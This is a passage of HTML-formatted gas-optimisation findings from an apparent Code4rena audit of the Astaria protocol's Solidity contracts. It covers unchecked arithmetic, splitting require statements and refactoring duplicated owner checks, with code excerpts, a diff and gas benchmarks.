class=\"mtk1\"> (</span><span class=\"mtk12\">uint64</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: uint64 epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">556</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_increaseOpenLiens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">VaultData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint64</span><span class=\"mtk1\"> </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L268-L272\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L268-L272</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"243\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">VaultImplementation</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: uint40 end</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">268</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_afterCommitToLien</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">269:    </span><span class=\"mtk10\">uint40</span><span class=\"mtk1\"> </span><span class=\"mtk10\">end</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">270:    </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">lienId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">271:    </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">slope</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">272</span><span class=\"mtk1\">:  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: uint8 position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">313</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">buyoutLien</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">314:    </span><span class=\"mtk10\">ILienToken</span><span class=\"mtk1\">.</span><span class=\"mtk10\">Stack</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">stack</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">315:    </span><span class=\"mtk10\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk10\">position</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">316:    </span><span class=\"mtk10\">IAstariaRouter</span><span class=\"mtk1\">.</span><span class=\"mtk10\">Commitment</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">incomingTerms</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">317</span><span class=\"mtk1\">:  )</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L790-L796\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L790-L796</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"244\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LienToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: uint8 position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">790</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_payment</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">791:    </span><span class=\"mtk10\">LienStorage</span><span class=\"mtk1\"> </span><span class=\"mtk10\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk10\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">792:    </span><span class=\"mtk10\">Stack</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">activeStack</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">793:    </span><span class=\"mtk10\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk10\">position</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">794:    </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">795:    </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">payer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">796</span><span class=\"mtk1\">:  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">Stack</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<h2 id=\"g-09-using-unchecked-blocks-to-save-gas\" style=\"position:relative;\"><a href=\"#g-09-using-unchecked-blocks-to-save-gas\" aria-label=\"g 09 using unchecked blocks to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-09] Using unchecked blocks to save gas</h2>\n<p>Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn’t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block.<br>\n<a href=\"https://github.com/ethereum/solidity/issues/10695\">see resource</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L710\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L710</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"245\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File:/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PublicVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">710</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">epochEnd</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The operation <code>epochEnd - block.timestamp</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L706\">Line 706</a> that ensures that <code>epochEnd</code> is greater than <code>block.timestamp</code> before performing the operation.</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L638\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L638</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"246\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LienToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">638</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">remaining</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">owing</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">payment</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The operation <code>owing - payment</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L637\">Line 637</a> that ensures that <code>owing</code> is greater than <code>payment</code> before performing our arithmetic operation</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L830\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L830</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"247\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LienToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">830</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>The operation <code>stack.point.amount - amount</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L829\">Line 829</a> that ensures that <code>stack.point.amount</code> is greater than <code>amount</code> before performing the subtraction</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L260\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L260</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"248\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">WithdrawProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">260</span><span class=\"mtk1\">:        (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expected</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawRatio</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p>The operation <code>s.expected - balance</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L258\">Line 258</a> that ensures that <code>s.expected</code> is greater than <code>balance</code> before performing the subtraction</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L264\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L264</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"249\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">WithdrawProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">264</span><span class=\"mtk1\">:     (</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expected</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawRatio</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p>The operation <code>balance - s.expected</code> cannot underflow as it would only be evaluated if  <code>balance</code> is greater than <code>s.expected</code>, which is enforced by the check on  <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L258\">Line 258</a></p>\n<h2 id=\"g-10-splitting-require-statements-that-use--saves-gas---saves-8-gas-per-\" style=\"position:relative;\"><a href=\"#g-10-splitting-require-statements-that-use--saves-gas---saves-8-gas-per-\" aria-label=\"g 10 splitting require statements that use  saves gas   saves 8 gas per  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-10] Splitting require() statements that use &#x26;&#x26; saves gas - (saves 8 gas per &#x26;&#x26;)</h2>\n<p>Instead of using the &#x26;&#x26; operator in a single require statement to check multiple conditions,using multiple require statements with 1 condition per require statement will save 8 GAS per &#x26;&#x26;\nThe gas difference would only be realized if the revert condition is realized(met).\nThe Gas saved could be higher as evident from the first instance due to refactoring which condition is checked first.</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/Vault.sol#L65\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/Vault.sol#L65</a>\n<strong>Gas benchmarks</strong>\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 2737    | 15363   | 21677 | 21677 |\n| After  | 599    | 15034   | 21677 | 21677 |</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"250\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">65</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">allowList</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] &amp;&amp; </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">());</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"251\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/Vault.sol b/src/Vault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index cee62cc..140a25f 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/Vault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/Vault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -61,8 +61,10 @@ contract Vault is VaultImplementation {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     virtual</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     returns (uint256)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       require(receiver == owner());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     VIData storage s = _loadVISlot();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    require(s.allowList[msg.sender] &amp;&amp; receiver == owner());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    require(s.allowList[msg.sender]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     return amount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<p><strong>Other instances:</strong><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L672-L675\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L672-L675</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"252\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PublicVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">672</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">673</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">674</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">epochData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">withdrawProxy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">675</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">687</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">688</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">689</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">epochData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">withdrawProxy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">690</span><span class=\"mtk1\">:    );</span></span></span></code></pre>\n<p><a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC20-Cloned.sol#L143-L146\">https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC20-Cloned.sol#L143-L146</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"253\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Cloned</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">143</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">144</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">recoveredAddress</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">recoveredAddress</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">145</span><span class=\"mtk1\">:        </span><span class=\"mtk8\">&quot;INVALID_SIGNER&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">146</span><span class=\"mtk1\">:      );</span></span></span></code></pre>\n<h2 id=\"g-11-duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function\" style=\"position:relative;\"><a href=\"#g-11-duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function\" aria-label=\"g 11 duplicated requirerevert checks should be refactored to a modifier or function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-11] Duplicated require()/revert() checks should be refactored to a modifier or function</h2>\n<p>See <a href=\"https://solidity.readthedocs.io/en/develop/contracts.html#function-modifiers\">docs</a></p>\n<p>This saves deployement gas<br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L78\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L78</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"254\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">VaultImplementation</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">()); </span><span class=\"mtk3\">//owner is &quot;strategist&quot;</span></span></span></code></pre>\n<p>The above check has been repeated in the following lines</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"255\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">96</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">()); </span><span class=\"mtk3\">//owner is &quot;strategist&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">()); </span><span class=\"mtk3\">//owner is &quot;strategist&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">()); </span><span class=\"mtk3\">//owner is &quot;strategist&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">147</span><span 